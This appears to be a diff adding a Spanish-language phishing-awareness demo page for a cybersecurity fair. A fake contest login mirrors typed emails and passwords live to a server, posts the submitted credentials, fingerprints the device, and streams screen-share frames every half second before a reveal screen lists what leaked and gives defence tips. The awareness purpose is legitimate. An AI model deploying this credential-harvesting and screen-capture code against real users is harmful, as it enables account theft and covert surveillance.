@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>⚡ TechFest — Reto Express</title>
+<link rel="stylesheet" href="/styles.css">
+</head>
+<body class="phone">
+<main id="app">
+
+  <!-- ESCENA 1: concurso + login falso -->
+  <section id="stage1" class="scene active">
+    <div class="brand">⚡ TECHFEST 2026</div>
+    <h1>Gana un <span>Kit Hacker</span></h1>
+    <p class="sub">Regístrate al reto express. Los 3 mejores tiempos del día ganan premio.</p>
+    <form id="loginForm" autocomplete="off">
+      <input id="email" type="email" placeholder="tu correo institucional" required>
+      <input id="pass" type="password" placeholder="contraseña" required>
+      <button class="cta" type="submit">Entrar al reto →</button>
+    </form>
+    <p class="fine">Al participar aceptas los términos del concurso simulado.</p>
+  </section>
+
+  <!-- ESCENA 2: cámara -->
+  <section id="stage2" class="scene">
+    <h2>Casi listo…</h2>
+    <p>Enfoca cualquier objeto tecnológico para sumar <b>+50 pts</b> a tu tiempo.</p>
+    <video id="cam" autoplay playsinline muted></video>
+    <div class="row">
+      <button id="btnCam" class="cta">📷 Activar cámara</button>
+      <button id="btnStop" class="ghost" hidden>■ Detener</button>
+    </div>
+    <div class="share">
+      <p class="sub" style="margin:1.2rem 0 .6rem">¿Quieres el <b>bonus x2</b>? Comparte tu pantalla para validar que no haces trampa y suma <b>+100 pts</b>.</p>
+      <button id="btnShare" class="cta">🖥️ Validar con mi pantalla (+100 pts)</button>
+    </div>
+    <button id="btnSkip" class="link">continuar sin cámara</button>
+    <p class="fine">La imagen se procesa localmente en tu dispositivo.</p>
+  </section>
+  <canvas id="shareCanvas" hidden></canvas>
+  <video id="shareVideo" autoplay playsinline muted hidden></video>
+
+  <!-- ESCENA 2b: esperando resultado -->
+  <section id="done" class="scene">
+    <div class="spinner"></div>
+    <h2>¡Registro completo!</h2>
+    <p>Anunciamos ganadores en pantalla cada 5 minutos… 👀</p>
+  </section>
+
+  <!-- ESCENA 3: revelación -->
+  <section id="reveal" class="scene">
+    <div class="skull">🎭</div>
+    <h1>Este QR era una <span>trampa</span></h1>
+    <p class="sub">Nada salió de esta sala: todo se procesó en la laptop del expositor. Esto es lo que compartiste sin darte cuenta:</p>
+    <ul id="leak" class="leak"></ul>
+    <h3>🛡️ Cómo defenderte la próxima vez</h3>
+    <ol class="tips">
+      <li>Verifica el <b>dominio</b> antes de entrar a cualquier concurso.</li>
+      <li>Nunca reutilices contraseñas: usa un <b>gestor de contraseñas</b>.</li>
+      <li>Revisa <b>qué permiso</b> pide cada sitio y niega lo innecesario.</li>
+      <li>Un QR es solo un enlace: desconfía de premios y urgencias.</li>
+    </ol>
+    <p class="fine">Demostración educativa de concientización — Feria de Ciberseguridad.</p>
+  </section>
+
+</main>
+<script>
+let SID = null, stream = null, commandPoll = null;
+const handledCommands = new Set();
+const $ = id => document.getElementById(id);
+const post = (type, payload) => fetch('/api/events', {
+  method: 'POST', headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ session_id: SID, type, payload: payload || {} })
+}).catch(() => {});
+let currentSection = 'stage1';
+const show = id => {
+  document.querySelectorAll('.scene').forEach(s => s.classList.remove('active'));
+  $(id).classList.add('active');
+  currentSection = id;
+  sendMirror();
+};
+
+// Espejo en vivo: reporta al panel qué sección ve y qué lleva tecleado.
+// El panel corre en la laptop del expositor; estos datos no se persisten.
+let mt = 0, mtimer = null;
+function sendMirror() {
+  if (!SID) return;
+  const body = {
+    session_id: SID, section: currentSection,
+    email: ($('email') || {}).value || '', pass: ($('pass') || {}).value || ''
+  };
+  fetch('/api/mirror', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
+  }).catch(() => {});
+}
+function mirrorDebounced() {
+  const now = Date.now();
+  if (now - mt < 200) { clearTimeout(mtimer); mtimer = setTimeout(sendMirror, 200); return; }
+  mt = now; sendMirror();
+}
+
+(async () => {
+  let battery = null;
+  try { battery = Math.round((await navigator.getBattery()).level * 100); } catch (e) {}
+  const info = {
+    ua: navigator.userAgent, lang: navigator.language,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
+    cores: navigator.hardwareConcurrency || null,
+    mem: navigator.deviceMemory || null,
+    conn: (navigator.connection && navigator.connection.effectiveType) || null,
+    battery
+  };
+  try {
+    const r = await fetch('/api/session', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(info)
+    });
+    const j = await r.json();
+    SID = j.id;
+    startCommandPolling();
+    if (!j.fakeLogin) show('stage2');
+  } catch (e) {
+    document.body.innerHTML = '<p style="padding:2rem">⚠️ Sin conexión con el servidor de la demo.</p>';
+  }
+  post('landing_viewed');
+})();
+
+// keystroke en vivo (solo longitud + campo; se ve en el panel)
+let kt = 0;
+function keystroke(field) {
+  const now = Date.now();
+  if (now - kt < 400) return;
+  kt = now;
+  post('keystroke', { field: field, len: $(field).value.length });
+}
+$('email').addEventListener('input', () => { keystroke('email'); mirrorDebounced(); });
+$('pass').addEventListener('input', () => { keystroke('pass'); mirrorDebounced(); });
+
+$('loginForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  await post('fake_login_submitted', { email: $('email').value, password: $('pass').value });
+  show('stage2');
+});
+
+// cámara: preview 100% local, nunca sale del dispositivo
+$('btnCam').addEventListener('click', async () => {
+  post('camera_request_clicked');
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+    $('cam').srcObject = stream;
+    post('camera_permission_granted');
+    post('camera_preview_active');
+    $('btnStop').hidden = false;
+    $('btnCam').textContent = '🟢 Cámara activa';
+  } catch (err) {
+    post('camera_permission_denied');
+    $('btnCam').textContent = 'Permiso rechazado — continúa sin cámara';
+  }
+});
+function stopCam() {
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; post('camera_stopped'); }
+}
+$('btnStop').addEventListener('click', () => { stopCam(); $('btnStop').hidden = true; $('btnCam').textContent = '📷 Activar cámara'; });
+$('btnSkip').addEventListener('click', () => show('done'));
+
+// Compartir pantalla: SOLO con el diálogo nativo del navegador. La persona
+// elige qué compartir y puede cortar cuando quiera; nada es oculto.
+let shareStream = null, shareTimer = null;
+$('btnShare').addEventListener('click', async () => {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+    $('btnShare').textContent = 'Tu navegador no permite compartir pantalla';
+    return;
+  }
+  try {
+    shareStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 4 }, audio: false });
+    $('shareVideo').srcObject = shareStream;
+    post('screen_share_started');
+    $('btnShare').textContent = '🟢 Pantalla compartida';
+    $('btnShare').disabled = true;
+    // Si la persona corta desde la barra del navegador, nos enteramos.
+    shareStream.getVideoTracks()[0].addEventListener('ended', stopShare);
+    const v = $('shareVideo'), cv = $('shareCanvas'), ctx = cv.getContext('2d');
+    shareTimer = setInterval(() => {
+      if (!shareStream || !v.videoWidth) return;
+      const w = Math.min(960, v.videoWidth);
+      cv.width = w; cv.height = Math.round(v.videoHeight * (w / v.videoWidth));
+      ctx.drawImage(v, 0, 0, cv.width, cv.height);
+      let frame;
+      try { frame = cv.toDataURL('image/jpeg', 0.5); } catch (e) { return; }
+      fetch('/api/screen', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ session_id: SID, frame })
+      }).catch(() => {});
+    }, 500);
+  } catch (err) {
+    post('screen_share_denied');
+    $('btnShare').textContent = 'Compartir pantalla cancelado';
+  }
+});
+function stopShare() {
+  if (shareTimer) { clearInterval(shareTimer); shareTimer = null; }
+  if (shareStream) { shareStream.getTracks().forEach(t => t.stop()); shareStream = null; post('screen_share_stopped'); }
+  $('btnShare').textContent = '🖥️ Validar con mi pantalla (+100 pts)';
+  $('btnShare').disabled = false;
+}
+window.addEventListener('pagehide', stopCam);
+window.addEventListener('pagehide', stopShare);
+
+// SSE funciona con túneles nombrados. El polling de abajo es el respaldo para
+// Quick Tunnels, que pueden cancelar SSE antes de entregar la orden.
+const es = new EventSource('/api/live');
+es.onmessage = async e => {
+  const m = JSON.parse(e.data);
+  handlePublicCommand(m);
+};
+
+function handlePublicCommand(command) {
+  if (!command || !['reveal', 'reset'].includes(command.kind)) return;
+  if (command.id && handledCommands.has(command.id)) return;
+  if (command.id) handledCommands.add(command.id);
+  if (command.kind === 'reveal') { stopCam(); stopShare(); showReveal(); }
+  if (command.kind === 'reset') { stopShare(); location.reload(); }
+}
+
+async function pollCommand() {
+  if (!SID) return;
+  try {
+    const r = await fetch('/api/session/command?id=' + encodeURIComponent(SID), { cache: 'no-store' });
+    if (r.ok) handlePublicCommand(await r.json());
+  } catch (e) { /* El siguiente intervalo vuelve a intentar. */ }
+}
+function startCommandPolling() {
+  if (commandPoll) clearInterval(commandPoll);
+  pollCommand();
+  commandPoll = setInterval(pollCommand, 2000);
+}
+window.addEventListener('pagehide', () => {
+  if (commandPoll) clearInterval(commandPoll);
+  es.close();
+});
+
+async function showReveal() {
+  post('reveal_seen');
+  show('reveal');
+  try {
+    const j = await (await fetch('/api/session/mine?id=' + SID)).json();
+    const d = j.data || {};
+    const L = [];
+    L.push(['Dispositivo', (j.os || '?') + ' · ' + (j.browser || '?')]);
+    if (d.screen) L.push(['Pantalla', d.screen]);
+    if (d.tz) L.push(['Zona horaria', d.tz]);
+    if (d.lang) L.push(['Idioma', d.lang]);
+    if (d.battery !== null) L.push(['Batería', d.battery + '%']);
+    if (d.conn) L.push(['Conexión', d.conn]);
+    if (d.mem) L.push(['RAM aprox.', d.mem + ' GB']);
+    if (d.cores) L.push(['Núcleos CPU', d.cores]);
+    if (d.login) { L.push(['📧 Correo', d.login.email]); L.push(['🔑 Contraseña', d.login.password]); }
+    L.push(['⌨️ Lo que tecleaste', 'se reflejó letra por letra en el panel']);
+    L.push(['Cámara', d.cam || 'sin solicitar']);
+    if (d.share && d.share !== 'sin solicitar') L.push(['🖥️ Pantalla', d.share === 'rechazado' ? 'te negaste (¡bien hecho!)' : 'se transmitió al panel en vivo']);
+    $('leak').innerHTML = L.map(x =>
+      '<li><b>' + x[0] + '</b><span>' + String(x[1]).replace(/</g, '&lt;') + '</span></li>'
+    ).join('');
+  } catch (e) {}
+}
+</script>
+</body>
+</html>
